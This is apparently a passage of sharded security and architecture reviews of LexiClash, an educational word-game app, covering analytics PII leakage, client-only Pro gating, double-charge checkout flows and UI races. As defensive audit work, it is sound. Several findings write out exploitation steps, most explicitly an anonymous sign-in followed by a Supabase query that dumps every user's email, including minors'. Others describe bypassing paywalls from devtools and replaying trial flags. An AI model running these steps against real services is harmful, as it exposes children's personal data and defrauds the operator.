**`PostHogProvider.tsx:45-77` (config) and `:88-92` (pageview URL)** · **Severity: medium (PII and secrets crossing a trust boundary)**

**Failure scenario:**
1. Line 92 sends `$current_url` with the full query string. posthog-js also attaches `$current_url` (`window.location.href`) to every event automatically, so fixing line 92 alone is not enough.
2. Query strings already in this codebase, per earlier shards, include:
   - `/auth/callback?code=…&next=…`
   - classroom join codes, `?room=`, and the miss-gap `classKey` share link
   - `teacher/reports?student=<id>`
   - `/daily?whName=<display name>`
   - `/brag/X?rival=<name>`
3. The config sets neither `autocapture: false` nor any masking. Autocapture is on by default and records `$el_text` of clicked elements. On teacher roster, report and leaderboard screens, that text is students' names.
4. `disable_session_recording` is not set. If session replay is enabled in the PostHog project (**verify**), teacher dashboards are recorded. Inputs are masked by default, but rendered text is not.

**Consequences:**
- Minors' names and IDs are stored at a third party.
- Classroom keys sit in analytics. Combined with Shard 4 #8 (anonymous users pass the roster gate), anyone with PostHog access can open a named class roster.
- **Verify:** if any auth route uses Supabase's `token_hash` confirm pattern rather than PKCE `?code=`, live login tokens are also stored. PKCE codes are low risk because they need the browser-held verifier.

**Fix:**
- In `before_send` (already wired to `filterEmptyException`), compose a URL scrubber. It should rewrite `$current_url`, `$referrer`, `$pathname` and `$initial_current_url` to the path plus an allowlist of `utm_*`, `ref` and `gclid`. If your posthog-js version supports it, `mask_personal_data_properties` with `custom_personal_data_properties: ['code','token_hash','room','classKey','student','whName','rival','next']` does the same.
- Set `autocapture: false`, or at least `mask_all_text: true` with `mask_all_element_attributes: true`.
- Set `disable_session_recording: true` explicitly. Re-enable it only per route, outside `/teacher` and `/student`.

---

## 3. The landing pageview is dropped, so the funnel's first step is missing on game routes
**`PostHogProvider.tsx:86` with `:99-115`** · **Severity: medium (data integrity of the revenue funnel)**

**Failure scenario:**
1. A user taps the Instagram reel and lands on `/he/singleplayer?utm_source=instagram`, a heavy game path.
2. Init is deferred to `requestIdleCallback`, which can take up to 4s (`:107-112`), so `posthogInitialized` is `false`.
3. `PostHogPageView`'s effect runs. Line 86 returns early because of `!posthogInitialized`, and the effect only re-runs on a pathname or search change. The landing `$pageview` is never sent.
   - The comment at `:102` says capture calls "queue on the lazy proxy", but this guard bypasses that queue.
4. On non-game routes, React runs child effects before parent effects. If the Suspense boundary hydrates in the same commit (dynamic routes), the child's effect also runs before `initPostHog()`. So whether the landing pageview survives depends on how each route is rendered.
5. **Fast bounces (inferred):** a player who leaves within the idle window triggers `installAbandonOnPagehide` (`:151`). That call goes to a proxy whose library was never loaded, so it is lost on unload. The "Game Abandoned" goal therefore misses the bounce cohort it was built to measure.
6. **Related inflation:** `:85-93` fires a new pageview on every `searchParams` change. The reports page's URL sync and similar pages therefore count extra pageviews.

**Impact:** the "ad → landing → play → signup" funnel is missing its first step for exactly the traffic you pay to acquire. You will under-credit Instagram and SEO when deciding where revenue is coming from.

**Fix:**
- Drop the `!posthogInitialized` guard and let the lazy proxy queue the call. **Verify** that the proxy really queues `capture`.
- Alternatively, emit the initial `$pageview` inside the `loaded` callback.
- Dedupe by pathname so that search-only changes don't create new pageviews.

---

## 4. LogRocket identification has no visible consent gate (verify)
**`fe-next/components/providers/LogRocketIdentify.tsx:12-15`** · **Severity: medium if confirmed**

**Failure scenario:**
1. The component calls `useLogRocketIdentify()` unconditionally on every auth change.
2. PostHog's gating (flawed as it is, see #1) has no equivalent visible here.
3. If the hook calls `LogRocket.identify(user.id, { email, name })` and LogRocket session replay runs regardless of consent, then signed-in students and teachers get identified replays at a second third party. That includes rendered student names, since replay masks inputs by default but not text.

**Fix:**
- Gate both `LogRocket.init` and `identify` on `hasConsent('analytics')`.
- Never send email or name for student or anonymous users.
- Exclude `/student` and classroom routes from replay.

---

## Footnote: gaps in the prior promo findings (content, not code)
- Shard 13's grid-word finding cites only the English video. **`WordleToLexiClashPromoHe.tsx:484-497`** has the same bug: CLASH is not on the grid and LEXICON cannot be traced. Fix both files.
- Shard 13's font-subset finding also applies to **`WordleToLexiClashPromoHe.tsx:40-43`**, where Heebo (Hebrew subset only) renders "3/6" and "#1,247".
- Both Word Hunt promos advertise **"4 Languages"** (`WordHuntPromoVideo.tsx:535`, `WordHuntPromoVideoHe.tsx:494`). The site claims six elsewhere. The prior pass flagged the 50K and 1M figures but not this one.

**To close out this area, send:** `lib/analytics/lazyPosthog.ts`, `hooks/useLogRocketIdentify.ts`, every `posthog.identify(` call site, and a screenshot of the PostHog project's session-replay and autocapture settings.

## Shard 16

# Senior review: what the previous pass missed

Scope is the files at the end of the prompt: providers, results, student join, and teacher class, plan and Pro components. I left out everything the previous pass already reported. That includes the hint timer, the double-join listener stacking, the stale student roster, the `LessonBuilder` draft and `teacherId` issues, and the "renews on" label for cancelled plans. The client-asserted `userId` on `joinClassroomGame` is also already covered under the socket-auth finding.

Several findings depend on server code or RLS policies I can't see. Those are marked **verify**.

---

## 1. Student emails are read straight from `profiles` in the browser
**`fe-next/components/teacher/ClassroomStudentList.tsx:119, 172, 180, 201-206`**
**Severity:** High if `profiles` RLS is broad; Medium if it is scoped to class members. **Verify.**

**Scenario:**
1. `ClassroomStudentList` is a `'use client'` component. It calls `getClassroomStudents(classroomId)` from `@/lib/supabase/education`, which runs under the browser's Supabase session.
2. The rows that come back include `profiles.email` (line 180), and the email is rendered to the teacher. So the `authenticated` role can SELECT the `email` column of other users' `profiles` rows.
3. `profiles` is also read for leaderboards, public profiles and rosters, so its SELECT policy is often `using (true)` for authenticated users.
4. Anonymous guests count as `authenticated`. The previous pass showed that `/api/education/classroom/join` mints them on demand, and `/en/brag` and `miss-gap` show other read paths.
5. So anyone can open devtools on lexiclash.live, call `signInAnonymously()`, and run `supabase.from('profiles').select('email')`. That would dump every user's email, including minors in classrooms.
6. Even if the policy is correctly scoped, the product sends student emails to teachers. That is a COPPA/FERPA data-minimisation problem on a children's product.

**Fix:**
- Move `email` out of the publicly readable surface. Either put it in a `private.user_contacts` table, or use column-level privileges: `REVOKE SELECT ON profiles FROM authenticated` and then `GRANT SELECT (id, username, display_name, avatar_config, …)` only.
- Serve the teacher roster from a server route that checks `classrooms.teacher_id = auth.uid()`.
- Decide whether teachers need student emails at all. The UI works without them.
- While you're in there, check that `setStudentLevel(classroomId, studentId, …)` (line 98, also a client write) is RLS-guarded so only the class owner can update it.

## 2. Most Pro features are enforced only in the browser
**`fe-next/components/teacher/ProGate.tsx:36-48, 88-91`**
**Severity:** Medium–High. This is a revenue leak on the one paid product.

**Scenario:**
1. The file's own "ENFORCEMENT TRUTH" comment says `mastery` and `missedPractice` are refused server-side (402).
2. `analytics`, `reports` and `pressureDials` have no such note. `pressureDials` is described as "gated inline in LobbyPressureDials".
3. `ProGate` only decides which JSX to render, based on `useTeacherPro().hasPro`.
4. A free teacher can flip `hasPro` in React DevTools, or call the underlying Supabase queries and API routes directly. Either way they get the full analytics dashboard and reports. The previous pass also found the "Recent Activity" feed rendered outside the gate.
5. For `pressureDials`, they can emit the pressure-settings socket event with calm-mode values. Unless `classroomPressureHandler` checks entitlement, the server accepts it.

**Fix:**
- Treat `PRO_FEATURES` as a server contract. Every data source behind `analytics` and `reports`, and the pressure socket handler, should call the same `resolveProEntitlement` check and return 402 the way `word-mastery` does.
- Keep `ProGate` as the UX layer only.
- Add a test that every `PRO_FEATURES` key maps to at least one server-side refusal.

## 3. The checkout button uses cookie-only `fetch`, so a signed-in teacher can be told "sign in required"
**`fe-next/components/teacher/ClassLimitUpsellModal.tsx:91-94`** and **`SubscriptionStatusCard.tsx:33-36, 58-60`**
**Severity:** Medium–High. It sits on the exact moment someone tries to pay.

**Scenario:**
1. `postTeacherProCheckout(fetch, …)` is explicitly passed the raw `fetch`, not `fetchWithAuth`.
2. The previous pass found two related facts:
   - `proxy.ts` never refreshes the Supabase session for `/api/*` routes.
   - `ownedClassroomRoute.ts:21` says the cookie session can be stale while the browser client has refreshed its token.
3. A teacher keeps the dashboard open for more than about an hour, which is normal in a school day. They hit the class cap and click "Upgrade".
4. The checkout POST carries an expired cookie and returns 401. The teacher sees the `signInRequired` toast while they are visibly signed in. The sale is lost.
5. The same thing happens on the profile page. `/api/subscription/status` returns 401, the card sets `error`, and the component returns `null`. The paying teacher's subscription panel, including the "Manage subscription" portal link, silently disappears.

**Fix:**
- Pass `fetchWithAuth` (Bearer token) to `postTeacherProCheckout`, and use it in `SubscriptionStatusCard` and `ProWelcomeCelebration`.
- On a 401, try a `supabase.auth.refreshSession()` and retry once before showing the sign-in toast.
- Check that `useTeacherProCheckout` (used by `ProGate`) is consistent with this.

## 4. No "payment pending" state, so a teacher can start a second subscription while the webhook lags
**`ProWelcomeCelebration.tsx:35-39`**, **`ClassLimitUpsellModal.tsx:78-102`**, **`ProGate.tsx:88-116`**
**Severity:** Medium (billing). **Verify** the server checkout route.

**Scenario:**
1. The teacher pays on Polar and lands back on `?checkout=success`.
2. The comment at line 35 admits that entitlement only flips once "Polar's webhook" lands, and the dashboard keeps polling for it.
3. Until then, `hasPro` is false everywhere. `ProGate` shows "Upgrade $9" and `ClassCapMeter` and `StudentCapMeter` still show the cap CTA.
4. A confused teacher clicks upgrade again. The server reads `subscriptions` and still sees "free", so it creates a second Polar checkout. They pay twice.
5. The previous pass found that `subscription.revoked` is keyed only on `userId`. Refunding or cancelling one of the two subscriptions can then downgrade the teacher entirely.
6. A smaller related point: `trackEduProCheckoutSuccessSeen` fires whenever `paid` is true. If `paid` comes from the URL parameter, your conversion metric can be inflated by hand-typed or bookmarked URLs. Count conversions from the webhook instead.

**Fix:**
- In the checkout route, refuse or reuse the session if the user has a checkout created in the last ~30 minutes, or any non-terminal provider subscription. Store the checkout id on creation.
- On the client, while `checkout=success` is present and `hasPro` is false, show "Payment received, activating…" in place of every upsell CTA.

## 5. Pressing Enter in the class form skips the saving guard, creating duplicate classes and racing the cap
**`ClassroomFormDialog.tsx:100-102`**, **`ClassroomManager.tsx:106-111`**
**Severity:** Medium.

**Scenario:**
1. Only the button respects `isSaving` (line 127). The `onKeyDown` Enter handler calls `handleSubmit()` unconditionally.
2. A teacher taps Enter twice, or presses Enter and then clicks the button. `handleCreate` runs twice before the dialog closes.
3. `uniqueClassroomName` is computed from the stale `classrooms` list both times, so the two inserts can even get the same name.
4. A free teacher at 2/3 classes gets two concurrent creates. If the server-side cap is check-then-insert (the student cap was shown to be exactly that), both pass and they end at 4 classes, above the free limit.
5. Separately, `handleCreate` and `handleEdit` have no `try/finally`. If `createClassroom` throws, `isSaving` stays true and the dialog is stuck on "Loading…".

**Fix:**
- Add an in-flight `useRef` guard at the top of `handleCreate` and `handleEdit`, and reset `isSaving` in `finally`.
- Enforce the class cap atomically in SQL, using an RPC or a trigger that counts under a lock.

## 6. Unguarded `sessionStorage` in hooks that mount app-wide can crash the app for guests
**`useSignupPrompt.ts:113, 166, 169`**, **`useSharePromptImpression.ts:21-23`**
**Severity:** Medium. **Verify** where the error boundary sits.

**Scenario:**
1. Safari with "Block all cookies", some managed Chromebook policies, and sandboxed iframes all throw `SecurityError` when a page touches `sessionStorage`. The Google Classroom add-on pages are served inside frames.
2. `useSignupPrompt` reads `sessionStorage` at line 113 for every guest once consent is decided. That happens before the `statsVersion` gate, so it runs on every page.
3. Per its header comment, it runs in `SignupPromptHost`, which mounts at the provider level. A throw inside `useEffect` bubbles to the nearest error boundary.
4. If that boundary is the root one, guests in those environments get the global error page on load. That includes students on locked-down school devices.

**Fix:** Wrap every web-storage access in a `safeSessionGet` / `safeSessionSet` helper that returns null on error. The previous pass found the same pattern in other storage helpers, so a lint rule banning bare `sessionStorage` / `localStorage` would close the whole class of bug.

## 7. Join-ack filtering is lopsided: foreign acks navigate, but untagged errors hang for 12 seconds
**`fe-next/components/student/useClassroomGameJoin.ts:58-60, 66-67`**
**Severity:** Low–Medium.

**Scenario:**
1. `onJoined` accepts a `joinedClassroomGame` that has *no* `gameCode`, because of `data?.gameCode && …`. On a shared socket, any untagged ack from an earlier or parallel join navigates the student into `gameCode`'s room, even if they were never admitted.
2. `onError` requires an exact `gameCode` match. If the server emits `AUTH_REQUIRED` or `USER_ID_MISMATCH` from a pre-handler auth check without echoing `gameCode`, it is ignored.
3. The student waits the full 12 seconds and then sees the generic "retry" message. The `signIn` mapping in `classroomJoinRefusal.ts:22-23` is never reached, so they retry forever instead of signing in.

**Fix:** Make both handlers strict about `gameCode`. Make sure every server `classroomGameError` for a join echoes `gameCode`, or give join-specific errors their own event.

## 8. The followed game mode accepts `startGame` from any room on the socket
**`fe-next/components/student/live/useFollowedClassroomGame.ts:36-39`**
**Severity:** Low–Medium. It depends on whether the mode selects which component renders.

**Scenario:**
1. `onModeChanged` filters by `gameCode`, but `onStart` and `onQuizTraffic` don't.
2. The socket is shared (see the comment in `useClassroomGameJoin`).
3. A `startGame` or vocab-quiz question from another room the socket is still subscribed to overwrites `followed` for the current `gameCode`.
4. The student's live view then switches to the wrong mode's UI mid-session.

**Fix:** Apply the same `payload.gameCode !== gameCode` early return in `onStart`. For quiz traffic, check the payload's room code.

## 9. Starter-pack creation is guarded only by CSS
**`fe-next/components/teacher/LessonBuilder.tsx:171-185, 227`**
**Severity:** Low (data integrity, clutter in the teacher library).

**Scenario:**
1. The only protection against a double click is `pointer-events-none` on the container (line 227), and that is applied after the re-render.
2. A fast double tap on "Use this pack" calls `createLesson` twice, so two identical lessons appear.
3. This is the same class of bug the previous pass found in the express launcher, but on a different path.

**Fix:** Add a `useRef` in-flight flag at the top of `handleSelectStarterPack`.

## 10. A paying teacher with a past comp grant may see the grant's end date as "Renews on"
**`fe-next/components/teacher/SubscriptionStatusCard.tsx:64-65`**
**Severity:** Low (billing trust). **Verify** what `/api/subscription/status` returns.

**Scenario:**
1. `endDate = grant?.expires_at ?? current_period_end` prefers the grant whenever a `grant` object is present, even when `source` is not `admin_grant` (`isGift` is false).
2. A teacher who received a 30-day comp and then paid would see the grant's expiry labelled "Renews on", not their real billing date.

**Fix:** Use `isGift ? grant.expires_at : current_period_end`.

---

**Fix first:** #1, because it is a possible PII dump for minors and costs one SQL statement to close. Then #3 and #4, which directly block or double-charge your first paying customers. #2 is the revenue-integrity item to schedule right after.

## Shard 17

# Security and architecture review: teacher Pro, checkout and analytics surfaces

This pass covers the files shown. Most findings sit on the checkout and entitlement path that the previous pass never reached. Several depend on `/api/subscription/checkout` and the Supabase queries behind the analytics hooks, which I couldn't see. I mark those **verify**. I left out everything the previous pass already reported: the AI-fill overwrite, the dead Export button, UTC "last active" dates, the assignment-cap loading window, and the form reset.

---

## 1. A trialing teacher who clicks "Upgrade" probably gets a second, separately billed subscription
**Severity: High (money). Verify against the checkout route.**

**Where:**
- `fe-next/components/teacher/TeacherProTrialExpiringBanner.tsx:62-66`
- `TeacherTrialWelcome.tsx:75-80`
- `TeacherProTrialLifecycleBanner.tsx:48-53`

**Scenario:**
1. A teacher starts the 14-day Polar trial and lands on HQ with `?checkout=success`.
2. `TeacherTrialWelcome` immediately shows a paid "Upgrade" button. On day 10, the expiring banner POSTs `{ trial: false }`. Its own comment at lines 30-31 says it goes "DIRECTLY to paid checkout… without the trial flag".
3. Checkout opens a new subscription. The existing `trialing` subscription is never touched.
4. The teacher is charged $9 now. On day 14 the trial subscription converts and charges $9 again.
5. They now have two subscription rows. Cancelling one fires the `subscription.revoked` path, which the previous pass showed is keyed only by `userId` (`webhook/polar/route.ts:281-291`). The teacher can then be downgraded while still paying for the other subscription.

**Fix:**
- Server side: `/api/subscription/checkout` should refuse to create a checkout when the user already has an `active` or `trialing` provider subscription. Return 409 `already_subscribed`.
- For "upgrade now during trial", end the trial on the existing subscription. Use Polar's subscription update or a customer-portal link rather than a new checkout.
- Client side: hide the paid CTA in `TeacherTrialWelcome` and the lifecycle banner while `status === 'trialing'`, or point it at the portal.

## 2. Paid but not provisioned: polling gives up after 16 seconds, then asks the teacher to pay again
**Severity: High (money and trust).**

**Where:**
- `fe-next/components/teacher/TeacherDashboard.tsx:96-107` (polling)
- `TeacherDashboard.tsx:156-160` (Pro card)

**Scenario:**
1. Polar redirects back before the webhook lands. This is the case the comment at line 95 anticipates.
2. The dashboard polls 8 times, every 2 seconds.
3. If the webhook is late (retries, a cold start, or a signature misconfiguration), polling stops with `hasPro` still false.
4. Nothing tells the teacher their payment is still processing. `proCard` renders the usage prompt or the Pro offer, and the plan badge says "Free plan / Upgrade".
5. The teacher pays again. Combined with #1, the server doesn't block it.

**Secondary issue (conditional):** the effect depends on `proLoading` and `refreshPro`. If `refresh()` toggles `loading`, or returns a new function identity, every refresh tears down the interval and restarts it with `tries = 0`. Polling then never stops while `?checkout=success` stays in the URL. That param is only removed by `TeacherTrialWelcome.close`.

**Fix:**
- While `checkoutSuccess && !hasPro`, render a "Confirming your payment…" state and suppress every Pro ask.
- Poll with backoff for about 2 minutes. Keep `tries` in a ref so a re-run doesn't reset it.
- After that, show "Payment received, activation delayed. Contact support", and include the Polar checkout id from the redirect.
- Pair this with the server-side guard from #1.

## 3. Trial eligibility is decided in the browser
**Severity: Medium (revenue leak). Verify.**

**Where:**
- `TeacherProTrialOfferBanner.tsx:45`
- `TeacherTrialUpgradeStatus.tsx:57,84`

**Scenario:**
1. `trial: true` is sent whenever the client-side `polarTrialUx(...).offerTrial` says so. That decision comes from the `trialUsed` value returned by `useTeacherPro`.
2. The flag is a plain JSON body field. A teacher can replay the POST with `{trial:true}` after cancelling.
3. A teacher can also use a second account with the same email or school.
4. If the route trusts the flag, Pro is effectively free in 14-day loops.

**Fix:** the checkout route must derive trial eligibility server-side:
- Check for any prior `trialing` or `subscription_events` row for the user, and for the Polar customer and email.
- Ignore or reject `trial:true` when the user isn't eligible.
- Treat the client flag as a request, never as an entitlement.

## 4. Checkout entry points have drifted, so the day-10 conversion CTA is the weakest one
**Severity: Medium (revenue path).**

**Where:**
- `TeacherProTrialExpiringBanner.tsx:62-74`
- `TeacherTrialUpgradeStatus.tsx:82-85`

**Scenario:**
- **Raw fetch on the highest-intent button.** The comments in `TeacherProAskBanner.tsx:12-16` and `TeacherProUsagePromptCard.tsx:25-28` say not to hand-roll checkout POSTs, because a second handler "drifts on 401/503". The day-10 banner, the highest-intent CTA in the product, does exactly that:
  - It uses a bare `fetch` with no auth header. Every other surface goes through `postTeacherProCheckout(fetch, …)`.
  - It has no 401 branch.
  - The previous pass found that API routes don't get a proxy session refresh. A teacher whose cookie is stale therefore clicks "Upgrade" and gets a generic "checkout error".
- **Missing locale.** `TeacherTrialUpgradeStatus` calls `postTeacherProCheckout` without `locale`, while the trial-offer banner passes `locale: language`. Hebrew, Japanese and other non-English teachers who convert from the persistent HQ strip probably return to the default-locale success URL.
- **Mislabelled analytics.** Line 75 logs `trackTrialCtaTap` with `source: 'dashboard_trial_offer'`, which pollutes the one funnel metric you are watching.

**Fix:**
- Route all four surfaces through `useTeacherProCheckout` / `postTeacherProCheckout`, and always pass `locale`.
- Give `TeacherTrialUpgradeStatus` its own telemetry source.

## 5. Parent-report links are minted per click as bearer capabilities to a minor's data
**Severity: Medium (privacy, compliance). Verify.**

**Where:** `fe-next/components/teacher/analytics/ShareParentReportButton.tsx:30-40`

**Scenario:**
1. Every click POSTs and mints a new signed, no-account URL for one student.
2. If `clipboard.writeText` fails (line 39, a common case on school Chromebooks), the teacher sees "failed" even though the token was minted. They click again and mint another.
3. Links get forwarded or pasted into group chats.
4. Nothing in the UI lets the teacher list or revoke links. I can't see an expiry.
5. When a student leaves the class, or a parent relationship changes, the old links presumably keep working.

**Fix (server side):**
- Make the token short-lived (for example 30 days) and bound to the current membership row, so it is invalid once the student is removed.
- Make the mint call idempotent: return the existing unexpired token for the same (teacher, student).
- Add a "revoke links" action.
- Make sure the report page is `noindex` and `no-store`.

**Fix (client side):** separate "minted" from "copied". If the copy fails, show the URL in a selectable field.

## 6. Pro analytics are aggregated and gated in the browser
**Severity: Medium (revenue leak now, performance at 10x).**

**Where:**
- `AnalyticsDashboard.tsx:66-67, 306, 313, 318`
- `StudentProgressTable.tsx:28`
- `WordMasteryCard.tsx:39-44`

**Scenario:**
1. One analytics view mounts at least five independent data hooks:
   - classroom analytics
   - student metrics (twice, once here and once in `StudentProgressTable`)
   - lesson effectiveness
   - word mastery, which folds `practice_sessions` client-side
   - the vocabulary heatmap
2. The previous pass found that `getStudentsProgressSummary` sums per-word JSON in JS. Each view therefore pulls roughly students × sessions × words of raw rows to the browser and recomputes them. At 10x roster and history, that means multi-MB payloads and slow school laptops.
3. The "Pro" boundary is a React `<ProGate>`. `AnalyticsDashboard` renders the Pro `WordMasteryCard` with no gate of its own.
4. The underlying Supabase reads are allowed by RLS to any teacher who owns the class. A free teacher can therefore run the same queries from devtools, or from any surface that forgets the gate.

**Fix:** move the aggregates into RPCs or API routes:
- `classroom_analytics_summary(classroom_id)`, `word_mastery_trend(classroom_id)` and `heatmap(classroom_id, lesson_id)`.
- Each should check ownership and Pro entitlement server-side and return only the aggregates.
- Dedupe the student-metrics fetch with a shared query cache.

## 7. Vocabulary heatmap is quadratic and re-renders the whole grid on every hover
**Severity: Medium (breaks at 10x).**

**Where:** `fe-next/components/teacher/analytics/VocabularyHeatmap.tsx:85-89, 149-151, 167-170`

**Scenario:**
1. `getCellData` runs `cells.find(...)` for every (student, word) pair. That is O(S·W) lookups, each O(S·W), so O((S·W)²).
2. At 30 students × 100 words that is about 9M comparisons. At 50 × 300 it is about 225M.
3. `onMouseEnter` sets component state, so every pointer move across a cell re-renders the entire grid and repeats the scan.
4. Teachers on Chromebooks see the tab freeze.

**Fix:**
- Build the lookup once: `useMemo(() => new Map(cells.map(c => [`${c.studentId}\u0000${c.word}`, c])), [cells])`.
- Move the hover tooltip into a memoised cell component, or use CSS `:hover` / `title`, so hovering doesn't re-render the parent.
- Virtualise rows past about 100 words.

## 8. Assignment creation: a partial failure duplicates lessons, and a thrown error locks the dialog
**Severity: Low–Medium (data integrity).**

**Where:** `fe-next/components/teacher/assignments/AssignmentCreator.tsx:164-183, 192-204, 223-245`

**Scenario:**
- **Duplicate lessons.** Template and word-goal flows create a lesson (via `createLesson`) and then create the assignment.
  1. Line 244 surfaces `result.assignmentError`, meaning the lesson was created but the assignment wasn't.
  2. The teacher retries and gets a second identical lesson, then a third.
- **Stuck dialog.** None of the three paths uses `try/finally`. If `createAssignment`, `createWordGoalAssignment` or `assignAssignmentTemplate` rejects (offline, or an expired token throwing), `isSubmitting` stays `true`. Submit and Cancel stay disabled, and the rejection is unhandled.

**Fix:**
- Wrap each path in `try { … } finally { setIsSubmitting(false) }`.
- On `assignmentError`, keep the created `lessonId` in state, and retry only the assignment insert on the next submit.
- Better: do lesson and assignment in one RPC transaction.

## 9. The LLM enrichment endpoint is capped only by the client
**Severity: Low–Medium (cost, abuse, content safety). Verify.**

**Where:** `fe-next/components/teacher/WordListEditor.tsx:162-171`

**Scenario:**
1. `MAX_ENRICH_WORDS` is applied with `.slice()` in the browser.
2. The POST body (`words`, `language`) is otherwise free-form, and it is sent with a bare `fetch`.
3. If `/api/education/lesson-enrich` doesn't itself require a teacher session, cap the count and word length, and rate-limit, it becomes an open model-spend sink.
4. Separately, model output (definitions, examples, synonyms) is merged straight into lessons that children see. Only an advisory highlight sits in between.

**Fix:**
- In the route: require an authenticated teacher, enforce the word cap and about 40 characters per word, and add the same `checkApiRateLimit` used elsewhere.
- Run a moderation pass on the generated text before returning it.

---

**Also noted (not ranked):** `status ?? 'active'` at `TeacherDashboard.tsx:112`, `TeacherPlanBadge.tsx:42` and `TeacherTrialUpgradeStatus.tsx:43` fails open in the client. If status is missing, a trial is treated as a paid subscription, which hides trial urgency and shows "renews on". Default to `'unknown'` instead.

**Fix first:** #1 and #2, with one server-side guard ("no new checkout while an active or trialing subscription exists") plus the "payment confirming" state. They are the only items here that can charge a real teacher twice, and they cost about a day.

## Shard 18

# Senior review: teacher assignments, digest, Home and HQ components

**Scope.** This covers only the files in this batch. I left out everything the earlier pass already reported for them:

- duplicate missed-words homework on retry
- UTC due-date shift
- invite text using the join code as the class name
- stale data and the NaN sort in `CompletionTracker`
- the unconditional ICS download
- the double `trackEduJoinCodeCopied`

Several findings depend on helpers I couldn't see, such as the checkout route, `getAssignmentCompletions`, RLS and `polarTrialDaysLeft`. Each one says what to check.

---

## 1. The weekly digest can send a trialing or paying teacher into a second checkout
**`fe-next/components/teacher/digest/WeeklyProgressDigestCard.tsx:55-67, 91, 197-198`**. **Severity: high if checkout doesn't deduplicate subscriptions.**

**Failure scenario**
1. A teacher starts the 14-day Polar trial, so `status = 'trialing'` and `trialExpires` is set.
2. Line 58 sets `isTrialing = daysLeft !== null || status === 'trialing'`, so the card shows the `trial` CTA (line 91).
3. The CTA is a plain link to `TEACHER_PRO_CHECKOUT_PATH` (line 198), not a "manage subscription" link.
4. The teacher clicks it to "lock in" Pro. If the checkout route doesn't detect the existing trialing subscription, Polar creates a second subscription, and the teacher is charged twice when the trial ends.

**Second path.** If `polarTrialDaysLeft` returns a non-null value from a `trialExpires` left over after the trial converted, a paying customer is also classed as `isTrialing`. That makes `isPaidPro` false (line 59), and the upgrade CTA appears for someone already paying.

**Fix**
- Server side: make the checkout route refuse, or redirect to the customer portal, when the user already has an `active` or `trialing` Polar subscription.
- Client side: send trialing and paid users to the billing or manage page, never to checkout.
- Compute `isTrialing` from `status === 'trialing'` only, not from the presence of a date.

## 2. A failed completions read shows "0% done, nobody completed"
**`fe-next/components/teacher/assignments/CompletionTracker.tsx:45-50`**, rendered at `:78-80` and `:90-92`. **Severity: medium (data integrity of a teacher report).**

**Failure scenario**
1. `getAssignmentCompletions` returns `{ error }`, for example from an RLS hiccup, a 5xx or an expired token.
2. `completions` stays `[]` and `isLoading` becomes false.
3. The tracker shows `0 / N students completed` and lists N rows of "Not completed".
4. The teacher chases students who did the homework, or concludes the feature lost their data. Nothing indicates that the read failed.

**Fix.** Keep an `error` state, render an error panel with a retry button, and don't compute percentages or "not completed" rows when there is an error.

## 3. "Struggling areas" probably always reports nothing
**`CompletionTracker.tsx:22-24, 48, 57-76, 206-209`**. **Severity: medium (a report feature that likely never works). Inferred.**

**Failure scenario**
1. Struggling words are built only from `completion.incorrectWords`, a camelCase field added by casting: `data as ExtendedCompletion[]`.
2. Supabase rows come back with snake_case column names. Unless `getAssignmentCompletions` explicitly maps a column into `incorrectWords`, the field is `undefined` on every row.
3. `strugglingWords` is then always empty. The panel tells every teacher that there are no struggling areas, which is false reassurance on a reporting surface you are selling.

**Fix.** Confirm what `getAssignmentCompletions` actually returns. If nothing populates `incorrectWords`, either select and map the real column, or hide the section until it is backed by data.

## 4. Roster status fetches the whole class mastery set, per card
**`fe-next/components/teacher/hq/ClassRosterStatus.tsx:62-76`**, mounted per card from `ClassroomCardActivity.tsx:92`. **Severity: medium. This breaks at roughly 10x scale.**

**Failure scenario**
1. Every class card on the Classes tab runs `getClassroomStudents` and `getClassMastery`. Each card also runs `useClassPulse`, and `ClassCard.tsx:77` calls `useTeacherPro()` once per card. A page of classes therefore fires about 4 requests per card.
2. `getClassMastery` returns every student×word row so the card can show six names.
3. At 50 students × 40+ words, the result exceeds PostgREST's default 1000-row cap (inferred from default config).
4. `buildClassInsights` then runs on truncated data. Some students show "Not yet" or a wrong accuracy figure, with no error.
5. The `t` dependency (line 76) refires both queries if `t` changes identity.

**Side issue: the Pro gate is cosmetic here.** `judge = hasPro` only changes the label. Free teachers still receive the full mastery data in the browser, and the "below goal" accuracy can be read from devtools.

**Fix**
- Add a server RPC that returns per-student status, already aggregated, for one class or a batch of classes.
- Apply the Pro judgement on the server.
- Move `useTeacherPro` into a context so it is read once per page, not once per card.

## 5. Missed-words homework is Pro-gated only in the browser, and `teacherId` comes from the client
**`fe-next/components/teacher/assignments/MissedWordsHomeworkCard.tsx:8-9, 76-83`**. **Severity: medium. Verify RLS.**

**Failure scenario**
1. The feature is protected only by `<ProGate feature="reports">`, a client component (see the comment at lines 8-9).
2. The card calls `createAssignment(...)` from the browser with `teacherId: user.id` and a `classroomId` prop.
3. A free teacher can call `createAssignment` from the console to generate per-student assignments, and skip both Pro and the free assignment cap.
4. If RLS on the assignments table doesn't enforce `teacher_id = auth.uid()` and classroom ownership, a teacher could also write assignments into another teacher's class by passing their `classroomId`.

**Fix**
- Move the bulk create into an API route or RPC.
- In that route, derive the teacher from the session, check classroom ownership and Pro entitlement, and enforce the cap.
- Confirm RLS rejects inserts where `teacher_id <> auth.uid()`.

## 6. Template assign buttons can create duplicate assignments
**`AssignmentTemplateGallery.tsx:149-153`, `FirstAssignmentTemplatePicker.tsx:31-36`**. **Severity: low-medium.**

**Failure scenario**
1. The only guard is `disabled={isSubmitting}`, a prop the parent sets after its async submit starts.
2. A fast double tap, common on Chromebooks and touchscreens, fires `onAssign(template)` twice before the parent re-renders.
3. Two identical assignments are created. On the free tier this also uses up the per-class assignment cap, which pushes the teacher to the paywall early.

**Fix.** Add a ref-based in-flight guard in the parent's handler, for example `if (submittingRef.current) return`. Or deduplicate on the server by `(classroom_id, template_id)` within a short window.

## 7. One malformed "last played" timestamp crashes Teacher Home
**`fe-next/components/teacher/home/HomeClassList.tsx:42-48`**. **Severity: low-medium (whole-page crash, narrow trigger).**

**Failure scenario**
1. `Date.parse(iso)` returns `NaN` for a malformed value, so `days` is `NaN`.
2. `NaN < 7` is false, so the code takes the `Intl.DateTimeFormat(...).format(new Date(iso))` branch.
3. Formatting an Invalid Date throws `RangeError`. That happens during render, so Home goes blank unless an error boundary catches it.
4. Separately, a server timestamp slightly ahead of the client clock gives a negative `days`, which renders as "tomorrow".

**Fix.** If `!Number.isFinite(Date.parse(iso))`, render the "—" state. Clamp `days` with `Math.max(0, days)`.

## 8. Word-count goal has no upper bound in the form
